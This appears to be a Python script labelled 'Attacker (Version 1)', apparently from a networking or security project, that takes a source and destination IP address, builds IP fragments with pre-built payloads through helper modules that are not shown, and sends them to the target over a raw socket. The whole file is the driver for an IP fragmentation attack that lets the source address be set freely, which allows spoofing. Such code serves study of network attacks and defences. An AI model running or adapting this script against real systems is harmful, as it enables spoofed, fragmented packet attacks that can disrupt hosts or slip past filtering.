# Attacker (Version 1) Code:

import sys
from helper_functs.attackParam import attackParamGen, attackParam
from helper_functs.ipHeadFieldGen import ipHeadFieldGen
from helper_functs.rawsocket import rawSockGen

if len(sys.argv)!=3:
    if (len(sys.argv)==1):
        print("Error: Both Source and Destination IP address are missing. Please enter them in order and try again!")
    elif (len(sys.argv)==2):
        print("Error: Destination IP address is missing. Please enter it and try again!")
    else:
        print("Error: Too many arguments provided. Please enter only Soruce and Destination IP address and try again!")

    sys.exit(1)
else:
    srcIP=sys.argv[1] #Later: add check for IP address in helper func
    dstIP=sys.argv[2]

attackParams=attackParamGen(srcIP,dstIP)

rawSock=rawSockGen();

for i in range(len(attackParams.allFragms)): #For each fragment, build the IP header add the pre-built payload and send it to the target destination address
    frag=attackParams.allFragms[i]

    if (i==(len(attackParams.allFragms)-1)):
        isLastFrag=True
    else:
        isLastFrag=False

    ipHeadPacket=ipHeadFieldGen(attackParams.srcIPAddr,attackParams.destIPAddr,attackParams.IDField,attackParams.TTL,attackParams.protoField,frag["fragSize"],frag["fragOffset"],isLastFrag)

    ipPacket=ipHeadPacket + frag["fragPayload"]
    rawSock.sendto(ipPacket, (attackParams.destIPAddr,0)) #
